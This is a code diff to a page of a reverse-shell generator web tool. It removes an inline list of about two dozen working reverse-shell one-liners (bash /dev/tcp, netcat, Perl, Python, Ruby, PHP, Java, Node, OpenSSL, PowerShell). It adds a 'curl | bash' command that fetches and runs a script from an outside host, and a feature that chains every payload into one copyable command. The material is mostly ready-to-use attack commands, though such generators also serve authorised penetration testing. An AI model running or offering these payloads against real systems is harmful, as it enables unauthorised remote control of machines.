@@ -53,6 +53,7 @@ draft: false
 <button onclick="generateShells()" style="margin-top: 25px;">Generate</button>
 </div>
 <p class="info">💡 Or use URL: <code>?ip:port</code> (e.g., <code>?192.168.1.100:4444</code>)</p>
+<p class="info">⚡ Or directly: <code>curl -s axolol.fr/r|bash -s 192.168.1.100:4444</code></p>
 </div>
 <div id="shells-container" style="display: none;">
 <div id="shells-output"></div>
@@ -63,36 +64,7 @@ draft: false
 </div>
 
 <script>
-    const shellDatabase = [
-        {name: "Bash -i", command: "bash -i >& /dev/tcp/{ip}/{port} 0>&1", meta: ["linux", "mac"]},
-        {name: "Bash 196", command: "0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196", meta: ["linux", "mac"]},
-        {name: "Bash read line", command: "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done", meta: ["linux", "mac"]},
-        {name: "Bash 5", command: "bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5", meta: ["linux", "mac"]},
-        {name: "Bash UDP", command: "bash -i >& /dev/udp/{ip}/{port} 0>&1", meta: ["linux", "mac"]},
-        {name: "nc mkfifo", command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f", meta: ["linux", "mac"]},
-        {name: "nc -e", command: "nc -e bash {ip} {port}", meta: ["linux", "mac"]},
-        {name: "nc -c", command: "nc -c bash {ip} {port}", meta: ["linux", "mac"]},
-        {name: "BusyBox nc", command: "busybox nc {ip} {port} -e bash", meta: ["linux"]},
-        {name: "ncat -e", command: "ncat {ip} {port} -e bash", meta: ["linux", "mac"]},
-        {name: "Perl", command: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", meta: ["linux", "mac"]},
-        {name: "Perl no sh", command: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'", meta: ["linux", "mac"]},
-        {name: "Python", command: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", meta: ["linux", "mac", "windows"]},
-        {name: "Python3", command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'", meta: ["linux", "mac"]},
-        {name: "Ruby", command: "ruby -rsocket -e'f=TCPSocket.new(\"{ip}\",{port});exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", meta: ["linux", "mac", "windows"]},
-        {name: "PHP fsockopen", command: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\", $pipes);'", meta: ["linux", "mac", "windows"]},
-        {name: "PHP shell_exec", command: "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/bash <&3 >&3 2>&3\");'", meta: ["linux", "mac", "windows"]},
-        {name: "PHP system", command: "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/bash <&3 >&3 2>&3\");'", meta: ["linux", "mac", "windows"]},
-        {name: "PHP passthru", command: "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/bash <&3 >&3 2>&3\");'", meta: ["linux", "mac"]},
-        {name: "PHP backticks", command: "php -r '$sock=fsockopen(\"{ip}\",{port});`/bin/bash <&3 >&3 2>&3`;'"},
-        {name: "PHP proc_open", command: "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'", meta: ["linux", "mac", "windows"]},
-        {name: "Java", command: "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\\\$line 2>&5 >&5; done\"] as String[]).waitFor();", meta: ["linux", "mac", "windows"]},
-        {name: "Node.js", command: "require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')", meta: ["linux", "mac", "windows"]},
-        {name: "OpenSSL", command: "mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s", meta: ["linux", "mac"]},
-        {name: "PowerShell #1", command: "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", meta: ["windows"]},
-        {name: "PowerShell #2", command: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", meta: ["windows"]},
-        {name: "nc.exe", command: "nc.exe {ip} {port} -e cmd.exe", meta: ["windows"]},
-        {name: "ncat.exe", command: "ncat.exe {ip} {port} -e cmd.exe", meta: ["windows"]}
-    ];
+    const shellDatabase = {{< rsdb >}};
 
     window.addEventListener('load', function() {
         const params = new URLSearchParams(window.location.search);
@@ -134,11 +106,13 @@ draft: false
         window.history.replaceState({}, '', `?${ip}:${port}`);
         const output = document.getElementById('shells-output');
         output.innerHTML = '';
+        const allCommands = [];
         shellDatabase.forEach(shell => {
             if (category !== 'all' && !(shell.meta || []).includes(category)) {
                 return;
             }
             const command = shell.command.replace(/{ip}/g, ip).replace(/{port}/g, port);
+            allCommands.push(command);
             const platforms = (shell.meta || []).map(m => {
                 const icons = { linux: '🐧', mac: '🍎', windows: '🪟' };
                 return icons[m] || m;
@@ -155,6 +129,21 @@ draft: false
             `;
             output.appendChild(shellBox);
         });
+        if (allCommands.length) {
+            const oneLiner = allCommands.join(';');
+            const oneLinerBox = document.createElement('div');
+            oneLinerBox.className = 'shell-box';
+            oneLinerBox.innerHTML = `
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                    <h3 style="margin: 0;">All-in-one (one-liner)</h3>
+                    <span>🐧 🍎 🪟</span>
+                </div>
+                <div class="shell-output" id="shell-oneliner">${oneLiner}</div>
+                <button class="copy-btn" onclick="copyToClipboard('shell-oneliner', this)">Copy</button>
+                <p class="info">💡 Toutes les commandes enchaînées avec <code>;</code> — la première qui aboutit donne le shell.</p>
+            `;
+            output.insertBefore(oneLinerBox, output.firstChild);
+        }
         document.getElementById('shells-container').style.display = 'block';
         document.getElementById('no-params').style.display = 'none';
     }
